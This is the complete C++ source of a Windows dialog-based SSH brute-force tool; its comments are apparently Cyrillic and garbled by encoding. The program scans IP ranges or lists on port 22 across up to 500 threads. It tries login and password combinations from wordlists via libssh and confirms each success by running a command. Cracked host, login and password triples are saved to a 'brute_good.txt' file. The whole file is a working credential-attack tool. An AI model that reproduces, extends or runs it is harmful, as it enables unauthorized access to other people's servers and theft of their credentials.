#include "main.h"
#include "resource.h"
//����� ���� ����
static const unsigned int EN_LIMIT = 10000;
//��������� ������������� ��������� �������
bool is_stop = false;
//������� ������� � ������ IP
volatile unsigned int ip_array_pos = 0;
//����� ������
volatile unsigned int gtid = 0;
//���������� ������� � ����
volatile unsigned int entry_num = 0;
//����� �������� ����
HWND ghWnd;

struct THR_START_INFO
{
	std::vector<std::string> * br_array;	//������ � �������� (����� | ������ | �����;������|)
	unsigned int br_array_size;				//������ ������
	std::vector<std::string> * ip_array;	//������ ip
	unsigned int ip_array_size;				//������ ������
	std::string single;						//������������� ����� ��� ������, � ����������� �� ������
	unsigned int brute_type;				//��� ��������
	unsigned int timeout;					//������� ����������� � �����
	unsigned int ip_type;					//��� �������� ip (�� ����� ��� �� ���������)
	volatile unsigned long ip_from;			//��������� IP �������� (��� �������� �� ���������)
	unsigned long ip_to;					//�������� IP ��������
	volatile unsigned int thr_num;			//���������� �������
};

//status - ���� � �����, fh - ������ � ����
CRITICAL_SECTION status, fh;

//�����
void Start(LPVOID pointer)
{
	THR_START_INFO * info = (THR_START_INFO *)pointer;

	sockaddr_in si;

	si.sin_family = AF_INET;
	si.sin_port = htons(22);
	DWORD mode = 1;

	fd_set fds_r, fds_w, fds_e;
	FD_ZERO(&fds_r);
	FD_ZERO(&fds_w);
	FD_ZERO(&fds_e);

	timeval tv;
	tv.tv_sec = tv.tv_usec = 0;

	//����� ������ � ��������� ���������� ��� ����������� ������ � ����
	unsigned int tid = InterlockedIncrement(&gtid);

	while (1)
	{
		SOCKET sock = INVALID_SOCKET;

		if (is_stop)
			break;

		unsigned long ip = 0uL;
		//ip_o - IP � ���� ������, ��� �������� � ������� �����������
		//ip_s - ������ � IP ��� ������ � ���
		std::string ip_o, ip_s;


		if (info->ip_type)	//���� ������� �� ���������
		{
			ip = InterlockedIncrement(&info->ip_from);
			if (ip > info->ip_to)
				break;

			ip = htonl(ip);
		}
		else				//���� ������� �� ������
		{
			unsigned int index = InterlockedIncrement(&ip_array_pos);
			if (index > info->ip_array_size)
				break;

			ip = inet_addr(info->ip_array->at(index - 1).c_str());
		}

		si.sin_addr.s_addr = ip;

		{
			char ip_text[sizeof "255.255.255.255"];
			sprintf_s
				(
				ip_text,
				sizeof(ip_text),
				"%u.%u.%u.%u",
				static_cast<unsigned char>(ip & 0xff),
				static_cast<unsigned char>((ip >> 8) & 0xff),
				static_cast<unsigned char>((ip >> 16) & 0xff),
				static_cast<unsigned char>((ip >> 24) & 0xff)
				);

			ip_s = ip_o = ip_text;
		}

		ip_s += " - ";


		sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (sock == INVALID_SOCKET)
		{
			AddInfo(ip_s + " ������ �������� ������", tid);
			continue;
		}

		if (ioctlsocket(sock, FIONBIO, &mode) == SOCKET_ERROR)
		{
			closesocket(sock);
			sock = INVALID_SOCKET;

			AddInfo(ip_s + " ������ ��������� �������������� ������", tid);
			continue;
		}

		if (connect(sock, (SOCKADDR *)&si, sizeof(si)) == SOCKET_ERROR && GetLastError() != WSAEWOULDBLOCK)
		{
			closesocket(sock);
			sock = INVALID_SOCKET;

			AddInfo(ip_s + " ������ �������� ������", tid);
			continue;
		}

		FD_SET(sock, &fds_r);
		FD_SET(sock, &fds_w);
		FD_SET(sock, &fds_e);

		bool check = false;

		//�������� ������ �������
		for (unsigned int time_counter = 0; time_counter < info->timeout; time_counter += 1000)
		{
			Sleep(1000);

			select(0, &fds_r, &fds_w, &fds_e, &tv);

			//�������� ���������� ������
			if (IsConnected(sock, &fds_r, &fds_w, &fds_e))
			{
				check = true;
				break;
			}

			if (is_stop)
			{
				closesocket(sock);
				sock = INVALID_SOCKET;

				break;
			}
		}

		if (!check)
			AddInfo(ip_s + " �� ������� ������������", tid);

		closesocket(sock);
		sock = INVALID_SOCKET;

		FD_ZERO(&fds_r);
		FD_ZERO(&fds_w);
		FD_ZERO(&fds_e);

		//���� �������� ����� ����������� �������
		if (check)
		{
			//����� � ������ ��� �������� � ������� �����������
			std::string login, password;

			if (info->brute_type == 1)		//������� �� ���������� ������
				login = info->single;
			else if (info->brute_type == 2)	//������� �� ���������� ������
				password = info->single;


			unsigned int index = 0;
			while (index < info->br_array_size) //���������� ������
			{
				std::string item = info->br_array->at(index++);

				if (info->brute_type == 1)		//������� �� ���������� ������
					password = item;
				else if (info->brute_type == 2)	//������� �� ���������� ������
					login = item;
				else if (info->brute_type == 3)	//������� �� ������ �����;������
				{
					std::string::size_type pos;

					if ((pos = item.find(";")) == std::string::npos)	//���� �� ������� ��������� ����� � ������
					{
						AddInfo(ip_s + " ����� ��������� " + item, tid);
						continue;
					}

					login = item.substr(0, pos).c_str();
					password = item.c_str() + pos + 1;
				}

				AddInfo(ip_s + " �������� " + login + ";" + password, tid);

				//������������ � �������
				if (CheckSSH(ip_o, login, password))
				{
					AddFile(ip_o + ";" + login + ";" + password + "\r\n");
					AddInfo(ip_s + " [+]: " + login + ";" + password, tid);
				}
				else
					AddInfo(ip_s + " [-]: " + login + ";" + password, tid);

				if (is_stop)
					break;
			}
		}

		if (is_stop)
			break;
	}



	//���� ������� ����� ���������, �� ������� �������� ��������� � �������� �������� ����������
	if (!InterlockedDecrement(&info->thr_num))
	{
		delete info->br_array;
		delete info->ip_array;
		delete info;

		EnableControls(TRUE);
		is_stop = false;
	}

	_endthread();
}

//������� ��������
bool CheckSSH(const std::string& ip, const std::string& login, const std::string& password)
{
	bool result = false;
	ssh_channel channel = NULL;

	ssh_session sess = ssh_new();
	if (sess == NULL)
	{
		AddInfo("������ �������� SSH-������ (" + ip + ")", 0);
		return result;
	}

	ssh_options_set(sess, SSH_OPTIONS_HOST, ip.c_str());
	ssh_options_set(sess, SSH_OPTIONS_USER, login.c_str());
	

	while (1)
	{
		int rc = ssh_connect(sess);
		if (rc != SSH_OK)
			break;

		rc = ssh_userauth_password(sess, NULL, password.c_str());
		if (rc != SSH_AUTH_SUCCESS)
			break;

		channel = ssh_channel_new(sess);
		if (channel == NULL)
			break;

		rc = ssh_channel_open_session(channel);
		if (rc != SSH_OK)
			break;

		rc = ssh_channel_request_exec(channel, "help");
		if (rc != SSH_OK)
			break;

		result = true;

		break;
	}
	
	if (channel)
		ssh_channel_free(channel);

	ssh_disconnect(sess);
	ssh_free(sess);

	return result;
}

//���������� �������� ��� � ����
void AddFile(const std::string& text)
{
	EnterCriticalSection(&fh);
	HANDLE file = CreateFile(TEXT("brute_good.txt"), FILE_APPEND_DATA, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file != INVALID_HANDLE_VALUE)
	{
		DWORD junk;
		WriteFile(file, text.c_str(), text.size(), &junk, NULL);
		CloseHandle(file);
	}
	LeaveCriticalSection(&fh);
}

//���������� ���������� � ���
void AddInfo(const std::string& text, unsigned int tid)
{
	std::stringstream ss;
	ss << "[" << tid << "] " << text << "\n";

	EnterCriticalSection(&status);

	if (InterlockedIncrement(&entry_num) > EN_LIMIT)
	{
		SetDlgItemText(ghWnd, STATUS, TEXT(""));
		InterlockedExchange(&entry_num, 0);
	}

	SendDlgItemMessage(ghWnd, STATUS, EM_SETSEL, -2, -2);
	SendDlgItemMessageA(ghWnd, STATUS, EM_REPLACESEL, 0, (LPARAM)ss.str().c_str());

	LeaveCriticalSection(&status);
}

//�������� ��������� ������
bool IsConnected(SOCKET s, fd_set *rd, fd_set *wr, fd_set *ex)
{
	WSASetLastError(0);

	if (!FD_ISSET(s, rd) && !FD_ISSET(s, wr))
		return false;

	if (FD_ISSET(s, ex))
		return false;

	return true;
}

//������ ����� � ������
unsigned int ReadToVector(const TCHAR* file_name, std::vector<std::string>* list)
{
	std::ifstream file;
	file.open(file_name, std::ifstream::in);

	if (!file)
	{
		return 0;
	}

	std::string ip;

	while (file.good())
	{
		std::getline(file, ip);
		list->push_back(ip);
	}

	return list->size();
}

//������������� ��������
bool InitBrute()
{
	TCHAR ip_list[MAX_PATH + 2];
	TCHAR br_list[MAX_PATH + 2];
	char single[64];

	//���� � ������
	GetDlgItemText(ghWnd, IP_LIST_FILE, ip_list, MAX_PATH + 2);
	GetDlgItemText(ghWnd, BR_LIST_FILE, br_list, MAX_PATH + 2);

	//��� ��������
	unsigned int type;
	if (SendDlgItemMessage(ghWnd, LOGIN_LIST, BM_GETCHECK, 0, 0) == BST_CHECKED)
		type = 1;
	else if (SendDlgItemMessage(ghWnd, PASSW_LIST, BM_GETCHECK, 0, 0) == BST_CHECKED)
		type = 2;
	else
		type = 3;

	if (type != 3 && GetDlgItemTextA(ghWnd, SINGLE, single, 64) == 0)
	{
		MessageBox(ghWnd, TEXT("����������, ��������� ���� �����/������"), TEXT("������"), MB_OK | MB_ICONEXCLAMATION);
		return false;
	}

	//�������� ����������� �������� �����
	HANDLE good = CreateFile(TEXT("brute_good.txt"), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (good == INVALID_HANDLE_VALUE)
	{
		MessageBox(ghWnd, TEXT("���������� ������� ���� brute_good.txt"), TEXT("������"), MB_OK | MB_ICONEXCLAMATION);
		return false;
	}
	CloseHandle(good);

	//������� ��� �������� ������� � ��������
	std::vector<std::string> *br_array = new std::vector<std::string>();
	std::vector<std::string> *ip_array = new std::vector<std::string>();

	unsigned int br_array_size, ip_array_size;

	br_array_size = ReadToVector(br_list, br_array);
	if (br_array_size == 0)
	{
		delete br_array;
		MessageBox(ghWnd, TEXT("������ ������ ��������"), TEXT("������"), MB_OK | MB_ICONEXCLAMATION);
		return false;
	}

	DWORD ip_from, ip_to;
	//��� �������� IP
	unsigned int ip_type = SendDlgItemMessage(ghWnd, IP_FROM_LIST, BM_GETCHECK, 0, 0) == BST_UNCHECKED ? 1 : 0;

	if (ip_type)
	{
		if
			(
			(SendDlgItemMessage(ghWnd, IP_FROM, IPM_GETADDRESS, 0, (LPARAM)&ip_from) != 4)
			||
			(SendDlgItemMessage(ghWnd, IP_TO, IPM_GETADDRESS, 0, (LPARAM)&ip_to) != 4)
			)
		{
			delete br_array;
			MessageBox(ghWnd, TEXT("IP ������ �����������"), TEXT("������"), MB_OK | MB_ICONEXCLAMATION);
			return false;
		}
	}
	else
	{
		ip_array_size = ReadToVector(ip_list, ip_array);
		if (ip_array_size == 0)
		{
			delete br_array;
			delete ip_array;
			MessageBox(ghWnd, TEXT("������ IP ������"), TEXT("������"), MB_OK | MB_ICONEXCLAMATION);
			return false;
		}
	}

	//������� ����
	SetDlgItemText(ghWnd, STATUS, TEXT(""));

	//��������� ���������� �������, ��������
	unsigned int thr_num = GetDlgItemInt(ghWnd, THR_NUM, 0, 0);
	unsigned int timeout = GetDlgItemInt(ghWnd, TIMEOUT, 0, 0);

	//������������� ���������, ������� ����� �������� ������
	THR_START_INFO * info = new THR_START_INFO;

	info->br_array = br_array;
	info->ip_array = ip_array;
	info->br_array_size = br_array_size;
	info->ip_array_size = ip_array_size;
	info->brute_type = type;
	info->ip_from = --ip_from;	//InterlockedIncrement �������� ��� ++i, ��� ����� ����� �������� ������ IP
	info->ip_to = ip_to;
	info->timeout = timeout;
	info->ip_type = ip_type;
	info->thr_num = thr_num;
	info->single = single;

	//��������� ���������� ����������
	ip_array_pos = entry_num = gtid = 0;

	//������ �������
	for (int i = 0, j = thr_num; i < j; i++)
		_beginthread(Start, 0, info);

	return true;
}

//���������� ������� �������� �����
DWORD GetOpenName(HINSTANCE hInstance, TCHAR* outbuf, const TCHAR* filter, const TCHAR* title)
{
	OPENFILENAME ofn;
	memset(&ofn, 0, sizeof(OPENFILENAME));

	TCHAR buf[MAX_PATH + 2];
	GetModuleFileName(hInstance, buf, 260);

	TCHAR* tmp = StrRChr(buf, NULL, L'\\');
	if (tmp != 0)
	{
		*tmp = 0;
		ofn.lpstrInitialDir = buf;
	}

	ofn.hInstance = hInstance;
	ofn.hwndOwner = ghWnd;
	ofn.lStructSize = sizeof(OPENFILENAME);
	ofn.lpstrFilter = filter;
	ofn.nFilterIndex = 1;
	ofn.lpstrFile = outbuf;
	ofn.lpstrFile[0] = 0;
	ofn.lpstrFile[1] = 0;
	ofn.nMaxFile = MAX_PATH;
	ofn.lpstrTitle = title;
	ofn.Flags = OFN_EXPLORER | OFN_DONTADDTORECENT | OFN_FILEMUSTEXIST | OFN_HIDEREADONLY | OFN_LONGNAMES | OFN_NONETWORKBUTTON | OFN_PATHMUSTEXIST;

	return GetOpenFileName(&ofn);
}

//���������/���������� ��������� ����������
void EnableControls(bool Enable)
{
	if (SendDlgItemMessage(ghWnd, IP_FROM_LIST, BM_GETCHECK, 0, 0) == BST_CHECKED)
	{
		EnableWindow(GetDlgItem(ghWnd, IP_LIST_FILE), Enable);
		EnableWindow(GetDlgItem(ghWnd, BROWSE_IP), Enable);
	}
	else
	{
		EnableWindow(GetDlgItem(ghWnd, IP_FROM), Enable);
		EnableWindow(GetDlgItem(ghWnd, IP_TO), Enable);
	}

	if (SendDlgItemMessage(ghWnd, LP_LIST, BM_GETCHECK, 0, 0) != BST_CHECKED)
	{
		EnableWindow(GetDlgItem(ghWnd, SINGLE), Enable);
	}

	EnableWindow(GetDlgItem(ghWnd, BR_LIST_FILE), Enable);
	EnableWindow(GetDlgItem(ghWnd, BROWSE_BR), Enable);

	EnableWindow(GetDlgItem(ghWnd, IP_FROM_LIST), Enable);
	EnableWindow(GetDlgItem(ghWnd, LOGIN_LIST), Enable);
	EnableWindow(GetDlgItem(ghWnd, PASSW_LIST), Enable);
	EnableWindow(GetDlgItem(ghWnd, LP_LIST), Enable);

	EnableWindow(GetDlgItem(ghWnd, START), Enable);

	EnableWindow(GetDlgItem(ghWnd, THR_SPIN), Enable);
	EnableWindow(GetDlgItem(ghWnd, TIME_SPIN), Enable);
	EnableWindow(GetDlgItem(ghWnd, STOP), !Enable);

}


//��������� ����������� ����
int DlgProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	static HICON ico;
	ghWnd = hWnd;

	switch (uMsg)
	{
	case WM_INITDIALOG:

		ico = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1));
		SendMessage(hWnd, WM_SETICON, ICON_SMALL, (LPARAM)ico);

		SendDlgItemMessage(hWnd, LOGIN_LIST, BM_SETCHECK, BST_CHECKED, 0);
		SendDlgItemMessage(hWnd, STATUS, EM_SETLIMITTEXT, -1, 0);
		SendDlgItemMessage(hWnd, SINGLE, EM_SETLIMITTEXT, 64, 0);

		SendDlgItemMessage(hWnd, THR_SPIN, UDM_SETRANGE32, 1, 500);
		SendDlgItemMessage(hWnd, TIME_SPIN, UDM_SETRANGE32, 1000, 100000);

		SendDlgItemMessage(hWnd, THR_SPIN, UDM_SETBUDDY, (WPARAM)GetDlgItem(hWnd, THR_NUM), 0);
		SendDlgItemMessage(hWnd, TIME_SPIN, UDM_SETBUDDY, (WPARAM)GetDlgItem(hWnd, TIMEOUT), 0);

		UDACCEL uda;
		uda.nInc = 1000;
		uda.nSec = 3;

		SendDlgItemMessage(hWnd, TIME_SPIN, UDM_SETACCEL, 1, (LPARAM)&uda);

		SendDlgItemMessage(hWnd, IP_FROM, IPM_SETADDRESS, 0, MAKEIPADDRESS(127, 0, 0, 1));
		SendDlgItemMessage(hWnd, IP_TO, IPM_SETADDRESS, 0, MAKEIPADDRESS(127, 0, 0, 5));

		WSADATA wsa;
		if (WSAStartup(MAKEWORD(2, 2), &wsa) != NO_ERROR)
		{
			MessageBox(hWnd, TEXT("������ ������������� WinSock"), TEXT("������"), MB_OK | MB_ICONERROR);
			return 1;
		}

		InitializeCriticalSection(&status);
		InitializeCriticalSection(&fh);

		SetDlgItemText(hWnd, STATUS, TEXT("�����...\n"));
		SetDlgItemText(hWnd, THR_NUM, TEXT("1"));
		SetDlgItemText(hWnd, TIMEOUT, TEXT("20000"));

		break;
	case WM_COMMAND:
		if (wParam == BROWSE_IP || wParam == BROWSE_BR)
		{
			TCHAR fname[MAX_PATH + 2];
			if (GetOpenName(GetModuleHandle(NULL), fname, TEXT("TEXT (*.txt)\0*.txt\0��� ����� (*.*)\0*.*\0\0"), TEXT("Open...")))
				SetDlgItemText(hWnd, wParam == BROWSE_IP ? IP_LIST_FILE : BR_LIST_FILE, fname);
		}
		else if (wParam == IP_FROM_LIST)
		{
			if (SendDlgItemMessage(hWnd, IP_FROM_LIST, BM_GETCHECK, 0, 0) == BST_CHECKED)
			{
				EnableWindow(GetDlgItem(hWnd, IP_FROM), FALSE);
				EnableWindow(GetDlgItem(hWnd, IP_TO), FALSE);

				EnableWindow(GetDlgItem(hWnd, IP_LIST_FILE), TRUE);
				EnableWindow(GetDlgItem(hWnd, BROWSE_IP), TRUE);
			}
			else
			{
				EnableWindow(GetDlgItem(hWnd, IP_FROM), TRUE);
				EnableWindow(GetDlgItem(hWnd, IP_TO), TRUE);

				EnableWindow(GetDlgItem(hWnd, IP_LIST_FILE), FALSE);
				EnableWindow(GetDlgItem(hWnd, BROWSE_IP), FALSE);
			}
		}
		else if (wParam == LOGIN_LIST || wParam == PASSW_LIST || wParam == LP_LIST)
		{
			if (SendDlgItemMessage(hWnd, LP_LIST, BM_GETCHECK, 0, 0) == BST_CHECKED)
			{
				EnableWindow(GetDlgItem(hWnd, SINGLE), FALSE);
				SetDlgItemText(hWnd, BR_LIST_TITLE, TEXT("�����;������"));
				break;
			}
			else if (SendDlgItemMessage(hWnd, LOGIN_LIST, BM_GETCHECK, 0, 0) == BST_CHECKED)
			{
				SetDlgItemText(hWnd, SINGLE_TITLE, TEXT("�����"));
				SetDlgItemText(hWnd, BR_LIST_TITLE, TEXT("������"));
			}
			else
			{
				SetDlgItemText(hWnd, SINGLE_TITLE, TEXT("������"));
				SetDlgItemText(hWnd, BR_LIST_TITLE, TEXT("������"));
			}
			EnableWindow(GetDlgItem(hWnd, SINGLE), TRUE);
		}
		else if (wParam == START)
		{
			EnableControls(FALSE);
			if (!InitBrute())
				EnableControls(TRUE);
		}
		else if (wParam == STOP)
			is_stop = true;

		break;
	case WM_CLOSE:
		DestroyIcon(ico);
		DeleteCriticalSection(&status);
		DeleteCriticalSection(&fh);
		WSACleanup();
		EndDialog(hWnd, 0);
		break;
	}

	return 0;
}

//������ ���
LONG WINAPI SEH(struct _EXCEPTION_POINTERS *lpTopLevelExceptionFilter)
{
	FatalAppExit(0, TEXT("���������������� ����������"));
	return 0L;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
#ifdef _DEBUG
	_CrtSetDbgFlag(_CRTDBG_ALLOC_MEM_DF | _CRTDBG_LEAK_CHECK_DF);
#endif

	SetUnhandledExceptionFilter(SEH);
	INITCOMMONCONTROLSEX ctrl;

	ctrl.dwSize = sizeof(INITCOMMONCONTROLSEX);
	ctrl.dwICC = ICC_DATE_CLASSES | ICC_INTERNET_CLASSES | ICC_PAGESCROLLER_CLASS | ICC_COOL_CLASSES;

	InitCommonControlsEx(&ctrl);

	DialogBoxParam(GetModuleHandle(NULL), MAKEINTRESOURCE(MAIN), 0, (DLGPROC)DlgProc, 0);

	return 0;
}
